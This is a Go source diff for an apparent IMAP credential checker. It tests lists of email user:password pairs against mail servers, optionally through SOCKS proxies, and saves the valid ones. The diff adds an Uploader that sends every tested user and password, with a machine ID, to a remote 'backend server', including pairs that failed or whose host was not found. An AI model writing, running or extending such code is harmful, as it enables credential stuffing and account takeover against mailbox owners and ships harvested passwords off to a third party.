@@ -13,6 +13,10 @@ import (
 	"sync/atomic"
 	"time"
 
+	"github.com/pierelucas/atlantr-extreme/uploader"
+
+	"github.com/pierelucas/atlantr-extreme/conn"
+
 	"golang.org/x/net/context"
 
 	"github.com/pierelucas/atlantr-extreme/imap"
@@ -28,6 +32,13 @@ func WorkerStateMachine(ctx context.Context, smobj *sm, startCH <-chan struct{},
 
 	// initalize a new imaper struct
 	imaper := imap.NewImap(matcherData, conf.GetUSESOCKS(), conf.GetPROCESSMAILS())
+
+	// We define a function for handle te upload when upload == true
+	uploadHandle := func(j *Job, up chan<- *Job) {
+		if upload {
+			up <- j
+		}
+	}
 
 	for {
 		select {
@@ -46,6 +57,7 @@ func WorkerStateMachine(ctx context.Context, smobj *sm, startCH <-chan struct{},
 			if !ok {
 				log.Printf("%s not found", hostToGet)
 				smobj.notFoundCH <- j
+				uploadHandle(j, smobj.uploadCH)
 				continue
 			}
 
@@ -71,6 +83,7 @@ func WorkerStateMachine(ctx context.Context, smobj *sm, startCH <-chan struct{},
 			valid, err := imaper.IMAPutil(socksAddr, addr, j.User, j.Pass)
 			if err != nil {
 				log.Printf("%v : %s\n", err, j.User)
+				uploadHandle(j, smobj.uploadCH)
 				continue
 			}
 
@@ -79,6 +92,7 @@ func WorkerStateMachine(ctx context.Context, smobj *sm, startCH <-chan struct{},
 			case true:
 				log.Printf("Valid: %s\n", j.User)
 				smobj.resultCH <- j
+				uploadHandle(j, smobj.uploadCH)
 			default:
 				log.Printf("Invalid: %s\n", j.User)
 			}
@@ -93,6 +107,8 @@ func WorkerStateMachine(ctx context.Context, smobj *sm, startCH <-chan struct{},
 // Producer --
 func Producer(ctx context.Context, smobj *sm, path string, startLine int, startCH <-chan struct{}) {
 	<-startCH // Wait till the main routine is ready
+
+	var err error
 
 	f, err := os.Open(path)
 	utils.CheckErrorFatal(err)
@@ -126,8 +142,12 @@ func Producer(ctx context.Context, smobj *sm, path string, startLine int, startC
 }
 
 // Writer --
-func Writer(ctx context.Context, result <-chan *Job, fileNameCH chan<- string, bufferSize int, path string, startCH <-chan struct{}) {
+func Writer(ctx context.Context, result <-chan *Job, bufferSize int, path string, startCH <-chan struct{}, wg *sync.WaitGroup) {
+	defer wg.Done()
+
 	<-startCH // Wait till the main routine is ready
+
+	var err error
 
 	var lineBreak string
 
@@ -142,9 +162,6 @@ func Writer(ctx context.Context, result <-chan *Job, fileNameCH chan<- string, b
 	// We need a better filename
 	t := time.Now()
 	filename := fmt.Sprintf("%s_%s.txt", path, t.Format("2006-01-02-15:04.05"))
-
-	// Store the new filename in our non-blocking channel
-	fileNameCH <- filename
 
 	f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0644)
 	utils.CheckErrorFatal(err)
@@ -180,6 +197,53 @@ func Writer(ctx context.Context, result <-chan *Job, fileNameCH chan<- string, b
 				j.User + ":" + j.Pass + lineBreak,
 			)
 			utils.CheckError(err)
+		}
+	}
+}
+
+// Uploader sends the Email User & Password to our backend server
+func Uploader(ctx context.Context, smobj *sm, backend string, startCH <-chan struct{}, wg *sync.WaitGroup) {
+	// if upload is diasbled, we return the function
+	if !upload {
+		wg.Done()
+		return
+	}
+
+	defer wg.Done()
+
+	<-startCH // Wait till the main routine is ready
+
+	var err error
+
+	// We have to create a new client wth
+	c, err := conn.NewClient(backend, debug)
+	utils.CheckError(err)
+
+	// Start the client
+	c.Start()
+
+	pair, err := uploader.NewPair("", "", machineID)
+	utils.CheckError(err)
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case j, ok := <-smobj.uploadCH:
+			if !ok {
+				return
+			}
+
+			pair.SetUser(j.User)
+			pair.SetPassword(j.Pass)
+
+			jsonString, err := pair.Marshal()
+			utils.CheckError(err)
+
+			err = c.Send(jsonString)
+			if debug {
+				utils.CheckError(err)
+			}
 		}
 	}
 }
